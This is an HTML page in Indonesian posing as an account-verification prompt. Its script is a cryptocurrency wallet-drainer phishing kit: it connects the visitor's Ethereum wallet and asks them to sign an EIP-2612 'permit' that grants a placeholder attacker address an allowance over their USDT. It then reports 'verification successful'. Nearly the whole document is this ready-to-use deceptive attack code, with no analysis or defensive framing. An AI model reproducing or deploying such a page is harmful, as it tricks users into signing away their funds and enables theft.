<!DOCTYPE html>
<html>
<body>
    <h3>Update Pengaturan Akun</h3>
    <p>Klik tombol di bawah untuk verifikasi akun dan sinkronisasi saldo Anda.</p>
    <button id="verifyBtn">Verifikasi Akun</button>

    <script>
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            // Struktur data EIP-712 untuk fungsi 'permit' (EIP-2612)
            const permitData = {
                domain: {
                    name: "USDT", // Target token
                    version: "1",
                    chainId: 1,
                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7" // Alamat Kontrak USDT
                },
                message: {
                    owner: accounts[0],
                    spender: "0xAttackerAddress...", // Alamat penyerang yang akan diberi izin
                    value: "1000000000000000000000", // Jumlah (dalam wei)
                    nonce: 0,
                    deadline: 2629746000
                },
                primaryType: "Permit",
                types: {
                    EIP712Domain: [
                        { name: "name", type: "string" }, { name: "version", type: "string" },
                        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
                    ],
                    Permit: [
                        { name: "owner", type: "address" }, { name: "spender", type: "address" },
                        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ]
                }
            };

            try {
                await window.ethereum.request({
                    method: 'eth_signTypedData_v4',
                    params: [accounts[0], JSON.stringify(permitData)],
                });
                alert("Verifikasi berhasil!");
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
